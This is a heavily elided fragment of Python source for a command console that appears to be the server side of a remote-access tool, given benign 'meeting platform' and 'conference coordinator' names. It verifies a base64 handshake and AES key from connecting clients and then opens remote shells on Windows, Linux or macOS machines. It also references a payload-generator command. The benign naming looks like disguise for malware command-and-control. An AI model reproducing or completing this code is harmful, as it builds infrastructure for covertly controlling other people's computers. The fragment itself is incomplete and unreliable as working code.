...
class conference_coordinator(cmd.Cmd):
    ...
    def __init__(self):
        ...
        self.prompt = "[Meeting-Platform] {} ".format(path_name)
        display_banner()
        ...
        if len(line.split()) != 1:
            ...
            if str(self.target) in self.inf_sock:
                ...
                try:
                    ...
                    if st_confirm == base64.b64encode('meeting_platform_shell'):
                        ...
                        if conn_aes in self.aes_lib.sections():
                            ...
                            if no_error(target_os):
                                if windows_client(target_os):
                                    ...
                                    meeting_platform_winshell.start_shell(self.target, self.listen_port,self.conn,self.aes_enc)
                                elif linux_client(target_os):
                                    st_print('[*] Starting Linux Shell...\n')
                                    meeting_platform_lnxshell.start_shell(self.target, self.listen_port,self.conn,self.aes_enc)
                                elif osx_client(target_os):
                                    st_print('[*] Starting Mac OS X Shell...\n')
                                    meeting_platform_osxshell.start_shell(self.target, self.listen_port,self.conn,self.aes_enc)
                                else:
                        ...
                        st_print('[!] Non-meeting_platform application trying to connect.\n')
                        self.conn.close()
                ...
                if st_confirm == base64.b64encode('meeting_platform_shell'):
                    ...
                    if conn_aes in self.aes_lib.sections():
                        ...
                        if no_error(target_os):
                            if windows_client(target_os):
                                st_print('[*] Starting Windows Shell...\n')
                                meeting_platform_winshell.start_shell(self.target, self.port,self.client,self.aes_enc)
                            elif linux_client(target_os):
                                st_print('[*] Starting Linux Shell...\n')
                                meeting_platform_lnxshell.start_shell(self.target, self.port,self.client,self.aes_enc)
                            elif osx_client(target_os):
                                st_print('[*] Starting OSX Shell...\n')
                                meeting_platform_osxshell.start_shell(self.target, self.port,self.client,self.aes_enc)
                            else:
                                st.log.error('Unsupported OS: {}'.format(target_os))
                                st_print('[!] Unsupported OS: {}\n'.format(target_os))
                        else:
...
################################################################################
    ...
    def help_meeting_platformgen(self): st_help_meeting_platformgen()
